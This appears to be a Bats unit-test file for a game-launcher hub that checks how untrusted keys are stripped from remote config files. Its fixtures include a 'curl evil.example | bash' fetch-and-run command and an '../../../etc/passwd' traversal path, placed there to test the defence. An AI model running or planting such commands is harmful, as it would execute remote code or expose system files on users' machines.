#!/usr/bin/env bash
# Unit tests for lib/commands/hub/context.sh and hub_sync_one_game.
load '../helpers.bash'

setup() {
	bats_unit_setup
	HUB_TMP="$(mktemp -d)"
	export XDG_CONFIG_HOME="$HUB_TMP"
	start_hub_mock_server test-secret 0
	write_hub_conf "$XDG_CONFIG_HOME" "$HUB_MOCK_URL" test-secret minimal
}

teardown() {
	stop_hub_mock_server
	[[ -n "${HUB_TMP:-}" ]] && rm -rf "$HUB_TMP"
}

@test "hub_validate_config_id rejects hyphens and short ids" {
	run bash -c '
		export CONFIG_DIR="'"$CONFIG_DIR"'"
		source "'"$BATS_TEST_DIRNAME"'/../helpers.bash"
		source_lib keys commands hub
		hub_validate_config_id cfg-test-1 2>&1
	'
	[[ $status -ne 0 ]]
	[[ "$output" == *"Invalid hub config ID"* ]]
}

@test "hub_validate_config_id accepts lowercase alphanumeric ids" {
	run bash -c '
		export CONFIG_DIR="'"$CONFIG_DIR"'"
		source "'"$BATS_TEST_DIRNAME"'/../helpers.bash"
		source_lib keys commands hub
		hub_validate_config_id cfgtest00001
		echo ok
	'
	[[ $status -eq 0 ]]
	[[ "$output" == ok ]]
}

@test "hub_sanitize_remote_env_file strips untrusted exec keys" {
	local tmp
	tmp="$(mktemp)"
	cat > "$tmp" <<'EOF'
INCLUDE=presets/standard.env
GAMEMODE=1
PRE_LAUNCH_CMD=curl evil.example | bash
POST_LAUNCH_CMD=
LAUNCH_WRAPPERS=gamescope
EOF
	run bash -c '
		export CONFIG_DIR="'"$CONFIG_DIR"'"
		source "'"$BATS_TEST_DIRNAME"'/../helpers.bash"
		source_lib keys config commands hub
		hub_sanitize_remote_env_file "'"$tmp"'" 2>&1
		echo "---"
		cat "'"$tmp"'"
	'
	[[ $status -eq 0 ]]
	[[ "$output" == *"Stripped untrusted hub keys"* ]]
	[[ "$output" == *"PRE_LAUNCH_CMD"* ]]
	[[ "$output" == *"LAUNCH_WRAPPERS"* ]]
	[[ "$output" == *"GAMEMODE=1"* ]]
	[[ "$output" == *"INCLUDE=presets/standard.env"* ]]
	[[ "$output" != *"curl evil.example"* ]]
	[[ "$output" == *"POST_LAUNCH_CMD="* ]]
	rm -f "$tmp"
}

@test "hub_assert_publish_env_safe rejects untrusted keys" {
	local tmp
	tmp="$(mktemp)"
	printf '%s\n' 'GAMEMODE=1' 'OVERRIDE_PROTON=/tmp/evil/proton' > "$tmp"
	run bash -c '
		export CONFIG_DIR="'"$CONFIG_DIR"'"
		source "'"$BATS_TEST_DIRNAME"'/../helpers.bash"
		source_lib keys config commands hub
		hub_assert_publish_env_safe "'"$tmp"'" 2>&1
	'
	[[ $status -ne 0 ]]
	[[ "$output" == *"Cannot publish"* ]]
	[[ "$output" == *"OVERRIDE_PROTON"* ]]
	rm -f "$tmp"
}

@test "hub_sanitize strips SPECIALTY_RUNTIME and CONTY" {
	local tmp
	tmp="$(mktemp)"
	cat > "$tmp" <<'EOF'
GAMEMODE=1
SPECIALTY_RUNTIME=boxtron
CONTY=1
SPECIAL_K_DLL=dxgi
EOF
	run bash -c '
		export CONFIG_DIR="'"$CONFIG_DIR"'"
		source "'"$BATS_TEST_DIRNAME"'/../helpers.bash"
		source_lib keys config commands hub
		hub_sanitize_remote_env_file "'"$tmp"'" 2>&1
		echo "---"
		cat "'"$tmp"'"
	'
	[[ $status -eq 0 ]]
	[[ "$output" == *"SPECIALTY_RUNTIME"* ]]
	[[ "$output" == *"CONTY"* ]]
	[[ "$output" == *"SPECIAL_K_DLL"* ]]
	[[ "$output" == *"GAMEMODE=1"* ]]
	! grep -q 'SPECIALTY_RUNTIME=' "$tmp"
	! grep -q '^CONTY=' "$tmp"
	rm -f "$tmp"
}

@test "hub untrusted keys come from config key metadata" {
	run bash -c '
		export CONFIG_DIR="'"$CONFIG_DIR"'"
		source "'"$BATS_TEST_DIRNAME"'/../helpers.bash"
		source_lib keys config commands hub
		mapfile -t from_file < <(
			for key in "${!LAUNCHLAYER_CONFIG_KEY_HUB[@]}"; do
				[[ "${LAUNCHLAYER_CONFIG_KEY_HUB[$key]}" == untrusted ]] && printf "%s\n" "$key"
			done | sort -u
		)
		mapfile -t from_bash < <(printf "%s\n" "${HUB_UNTRUSTED_ENV_KEYS[@]}" | sort -u)
		diff -u <(printf "%s\n" "${from_file[@]}") <(printf "%s\n" "${from_bash[@]}")
	'
	[[ $status -eq 0 ]]
}

@test "hub_sanitize_remote_env_file strips unsafe INCLUDE paths" {
	local tmp
	tmp="$(mktemp)"
	cat > "$tmp" <<'EOF'
INCLUDE=../../../etc/passwd
GAMEMODE=1
EOF
	run bash -c '
		export CONFIG_DIR="'"$CONFIG_DIR"'"
		source "'"$BATS_TEST_DIRNAME"'/../helpers.bash"
		source_lib keys config commands hub
		hub_sanitize_remote_env_file "'"$tmp"'" 2>&1
		echo "---"
		cat "'"$tmp"'"
	'
	[[ $status -eq 0 ]]
	[[ "$output" == *"Stripped untrusted hub keys"* ]]
	[[ "$output" == *"GAMEMODE=1"* ]]
	# Sanitized file must not retain the traversal INCLUDE line.
	! grep -q 'INCLUDE=' "$tmp"
	rm -f "$tmp"
}

@test "hub_sync_one_game uploads via mock and sets HUB_SYNC_UPDATED" {
	local fp='{"gpu_vendor":"nvidia","os_family":"arch","session_type":"wayland","profiles":[],"display_tier":"1440p","vrr":false,"wsl2":false,"flatpak_steam":false,"steam_deck":false,"immutable":false,"container":false}'
	run env XDG_CONFIG_HOME="$HUB_TMP" bash -c '
		export CONFIG_DIR="'"$CONFIG_DIR"'"
		source "'"$BATS_TEST_DIRNAME"'/../helpers.bash"
		source_lib commands prefs platform hardware cli tools hub
		hub_find_my_config_id() { return 1; }
		hub_sync_one_game '"$(printf '%q' "$fp")"' 42424242 "Sync Game" "GAMEMODE=1" "unit test"
		printf "updated:%s\n" "$HUB_SYNC_UPDATED"
		printf "response:%s\n" "$HUB_SYNC_RESPONSE"
	'
	[[ $status -eq 0 ]]
	[[ "$output" == *"updated:"* ]]
	[[ "$output" == *"response:"* ]]
	[[ "$output" == *"config_id"* || "$output" == *"updated"* ]]
}
